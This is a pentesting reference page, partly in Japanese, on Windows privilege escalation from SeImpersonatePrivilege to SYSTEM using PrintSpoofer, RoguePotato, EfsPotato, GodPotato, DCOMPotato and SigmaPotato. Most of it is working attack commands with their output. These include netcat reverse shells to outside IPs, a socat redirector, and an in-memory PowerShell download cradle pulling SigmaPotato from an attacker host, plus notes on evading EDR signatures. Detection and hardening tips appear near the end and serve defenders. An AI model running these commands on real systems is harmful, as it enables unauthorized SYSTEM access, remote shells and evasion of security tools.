# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotatoはWindows Server 2019およびWindows 10 build 1809以降では動作しません。** しかし、 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** を使用して、同等の権限を悪用し `NT AUTHORITY\SYSTEM` レベルのアクセスを取得できます。This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) は `PrintSpoofer` ツールについて詳述しており、JuicyPotato が動作しない Windows 10 および Server 2019 ホスト上でインパーソネーション権限を悪用する方法を説明しています。

> [!TIP]
> 2024–2025 に頻繁にメンテナンスされている現代的な代替は SigmaPotato（GodPotato のフォーク）で、in-memory/.NET reflection usage と拡張された OS サポートを追加します。下のクイック使用例と References のリポジトリを参照してください。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件と一般的な注意点

以下のすべてのテクニックは、次のいずれかの特権を保持するコンテキストから、インパーソネーション可能な特権サービスを悪用することに依存します：

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- トークンが既に SeImpersonatePrivilege を持っている場合、High integrity は必要ありません（IIS AppPool、MSSQL など多くのサービスアカウントで典型的です）。

特権を素早く確認する:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意:
- 現在のコンソールで対話型プロセスを起動するには -i を、ワンライナーを実行するには -c を使用できます。
- Spooler service が必要です。無効になっていると失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンドのポート135がブロックされている場合は、リダイレクター上でsocatを使ってOXID resolverをpivotしてください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: ある pipe が失敗するか EDR によってブロックされた場合は、他のサポートされている pipes を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、既定で RPC_C_IMP_LEVEL_IMPERSONATE に設定されているサービスの DCOM オブジェクトをターゲットにする 2 種類のバリアントを提供します。付属のバイナリをビルドするか使用し、コマンドを実行してください：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新された GodPotato フォーク)

SigmaPotatoは、.NET reflectionによるin-memory executionやPowerShell reverse shell helperのような最新の便利機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 検出とハードニングの注意点

- 名前付きパイプを作成し、直後にトークン複製 API を呼び出し、その後 CreateProcessAsUser/CreateProcessWithTokenW を実行するプロセスを監視する。Sysmon は有用なテレメトリを提供できる: Event ID 1（プロセス作成）、17/18（名前付きパイプ作成/接続）、および SYSTEM として子プロセスを生成するコマンドライン。
- Spooler のハードニング: 必要のないサーバーで Print Spooler サービスを無効化すると、spoolss 経由の PrintSpoofer スタイルのローカルでの悪用（権限昇格など）を防げる。
- サービスアカウントのハードニング: カスタムサービスに対する SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege の割り当てを最小限にする。可能であれば、必要最小権限の仮想アカウントでサービスを実行し、サービス SID と書き込み制限されたトークンで分離することを検討する。
- ネットワーク制御: 送信 TCP/135 をブロックするか RPC endpoint mapper のトラフィックを制限すると、内部リダイレクタが利用できない限り RoguePotato の動作を妨げられる。
- EDR/AV: これらのツールは広くシグネチャ化されている。ソースから再コンパイルしたり、シンボル/文字列のリネーム、インメモリ実行を使用すると検出を軽減できるが、堅牢な振る舞い検知を回避することはできない。

## 参考資料

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
